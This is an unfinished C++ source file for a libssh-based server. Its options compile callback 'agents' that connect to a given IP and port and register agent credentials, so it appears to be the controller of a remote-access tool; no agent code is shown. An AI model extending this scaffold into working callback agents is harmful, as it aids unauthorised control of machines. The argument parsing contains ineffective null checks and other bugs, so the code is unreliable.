#include "server.h"

#ifdef HAVE_ARGP_H
#include <argp.h>
#endif


// TODO: RETHINK THIS WHOLE THING
#ifdef HAVE_ARGP_H
const char *argp_program_version = "libssh server example "
    SSH_STRINGIFY(LIBSSH_VERSION);
const char *argp_program_bug_address = "<libssh@libssh.org>";

/* Program documentation. */
static char doc[] = "libssh -- a Secure Shell protocol implementation";

/* A description of the arguments we accept. */
static char args_doc[] = "BINDADDR";

/* The options we understand. */
static struct argp_option options[] = {
    {
        .name  = "port",
        .key   = 'p',
        .arg   = "PORT",
        .flags = 0,
        .doc   = "Set the port to bind.",
        .group = 0
    },
    {
        .name  = "hostkey",
        .key   = 'k',
        .arg   = "FILE",
        .flags = 0,
        .doc   = "Set the host key.",
        .group = 0
    },
    {
        .name  = "dsakey",
        .key   = 'd',
        .arg   = "FILE",
        .flags = 0,
        .doc   = "Set the dsa key.",
        .group = 0
    },
    {
        .name  = "rsakey",
        .key   = 'r',
        .arg   = "FILE",
        .flags = 0,
        .doc   = "Set the rsa key.",
        .group = 0
    },
    {
        .name  = "verbose",
        .key   = 'v',
        .arg   = NULL,
        .flags = 0,
        .doc   = "Get verbose output.",
        .group = 0
    },
    {
        .name = "agent",
        .key = 'a',
        .arg = "IP:PORT",
        .flags = 0,
        .doc = "Compile an agent which will connect to IP over PORT",
        .group = 0
    },
    {
        .name = "authenticate",
        .key = 'i',
        .arg = "ID:PASS",
        .flags = 0,
        .doc = "Add agent information to the server database",
        .group = 0
    },
    {NULL, 0, 0, 0, NULL, 0}
};

/* Parse a single option. */
static error_t parse_opt (int key, char *arg, struct argp_state *state) {
  /* Get the input argument from argp_parse, which we
   * know is a pointer to our arguments structure.
   */
    ssh_bind sshbind = (ssh_bind) state->input;
    char *ip;
    char *port;
    char *pass;
    char *id;
    int dbg = 0;
    int halt = 0;
    char buff[256];
    AgentInformationHandler *handler = new AgentInformationHandler();
  
    switch (key) {
        case 'p':
            ssh_bind_options_set(sshbind, SSH_BIND_OPTIONS_BINDPORT_STR, arg);
            break;
        case 'd':
            ssh_bind_options_set(sshbind, SSH_BIND_OPTIONS_DSAKEY, arg);
            break;
        case 'k':
            ssh_bind_options_set(sshbind, SSH_BIND_OPTIONS_HOSTKEY, arg);
            break;
        case 'r':
            ssh_bind_options_set(sshbind, SSH_BIND_OPTIONS_RSAKEY, arg);
            break;
        case 'v':
            ssh_bind_options_set(sshbind, SSH_BIND_OPTIONS_LOG_VERBOSITY_STR, "3");
            break;
        case 'a':
            halt = 1;
            port = strchr(arg, ':') + 1;
            if(port == NULL){
                printf("Improper format: needs to be IP:PORT\n");
                argp_usage(state);
            }
            dbg = misc_index_of(arg, ':', 0);
            ip = misc_substring(arg, dbg, strlen(arg));
        
            handler->compile(ip, port);
            free(ip);
            break;
        case 'i':
            halt = 1;
            pass = strchr(arg, ':') + 1;
            if(pass == NULL){
                printf("Improper format: needs to be ID:PASSWORD\n");
                argp_usage(state);
            }
            dbg = misc_index_of(arg, ':', 0);
            id = misc_substring(arg, dbg, strlen(arg));

            AgentInformationHandler::register_agent(id, pass);
            sprintf(buff, "Registered agent with %s and %s\n", id, pass);
            free(id);
            break;
        case ARGP_KEY_ARG:
            if (state->arg_num >= 1) {
            /* Too many arguments. */
                argp_usage (state);
            }
            ssh_bind_options_set(sshbind, SSH_BIND_OPTIONS_BINDADDR, arg);
            break;
        case ARGP_KEY_END:
            if (state->arg_num < 1) {
                /* Not enough arguments. */
                delete handler;
                if(!halt)
                    argp_usage (state);
                else exit(0);
            }
            break;
        default:
            return ARGP_ERR_UNKNOWN;
    }

    return 0;
}

/* Our argp parser. */
static struct argp argp = {options, parse_opt, args_doc, doc, NULL, NULL, NULL};
#endif /* HAVE_ARGP_H */

/*Global variables and data structures*/
pthread_t thread_array[MAX_CONN];


/*handy little print function for debugging pClientDat structures*/
void print_clientDat(pClientDat str){
    printf("\n\nID: %s\n", str->id);
    printf("Type: %d\n\n\n", str->type);
}

Server::Server(){
    this->sessions = new std::vector<ConnectionInstance *>(5);
    this->logger = new Log();
}

/*int Server::bind_port(int port){
    int type = 0;
    int opt = 0;

    if( (this->master_socket = socket(AF_INET , SOCK_STREAM , 0)) == 0){   
        perror("Server: Socket Failure");   
        return 1;   
    }

    if(setsockopt(master_socket, SOL_SOCKET, SO_REUSEADDR, (char *)&opt, sizeof(opt)) < 0 ){   
        perror("Server: Setsockopt Failure");   
        return 1;   
    }


    switch (type)
    {
    case 0:
        this->transport = new Ssh_Transport(logger, list, nullptr);
        break;
    
    default:
        break;
    }
    
}*/

void Server::add_instance(ConnectionInstance *instance){
    this->sessions->push_back(instance);
}

class Log *Server::get_log(){
    return this->logger;
}

int Server::listen_instance(int index){
    pthread_t thread;
    class ConnectionInstance **array = this->sessions->data();
    class ConnectionInstance *instance = array[index];
    int rc = instance->get_transport()->listen(this->master_socket);
    // pass connection to handler thread
    if(pthread_create(&thread, NULL, instance->handle_connection, instance)){
        printf("Error creating thread\n");
        delete instance;
        return 1;
    }
    
    return 0;
}


/*Funny enough, this is the main function*/
int main(int argc, char **argv){
    // TODO: UPDATE SIGHANDLERS TO MODERN STUFF

    // set up signal handlers
    //struct sigaction sigIntHandler;
	//struct sigaction sigTermHandler;


	//sigIntHandler.sa_handler = handleTerm;
   	//sigemptyset(&sigIntHandler.sa_mask);
   	//sigIntHandler.sa_flags = 0;

	//sigTermHandler.sa_handler = handleTerm;
	//sigemptyset(&sigTermHandler.sa_mask);
	//sigTermHandler.sa_flags = 0;

   	//sigaction(SIGINT, &sigIntHandler, NULL);
    //sigaction(SIGTERM, &sigTermHandler, NULL);
    
    // initialize variables
    Server *server = new Server();
    ConnectionInstance *instance = new ConnectionInstance(server);
    ServerTransport *def_transport = new Ssh_Transport(instance);

    instance->set_transport(def_transport);
    server->add_instance(instance);
    server->listen_instance(1);
/*   
#ifdef HAVE_ARGP_H
    /*
     * Parse our arguments; every option seen by parse_opt will
     * be reflected in arguments.
     *
    argp_parse (&argp, argc, argv, 0, 0, sshbind);
#else
    (void) argc;
    (void) argv;
#endif*/

    
    // accept connections
    // TODO: FIX THIS SO LOOP BIND WORKS LOL
  
    while(1){
        sleep(1);
    }
        
        
    //for (size_t i = 0; i < ctr; i++){
      //  if(pthread_join(thread_array[i], NULL)){
        //    printf("Failed to join thread at index %lu\n", i);
    //    }
    //}

    
    printf("Server: Terminated successfully\n");
    return 0;
}
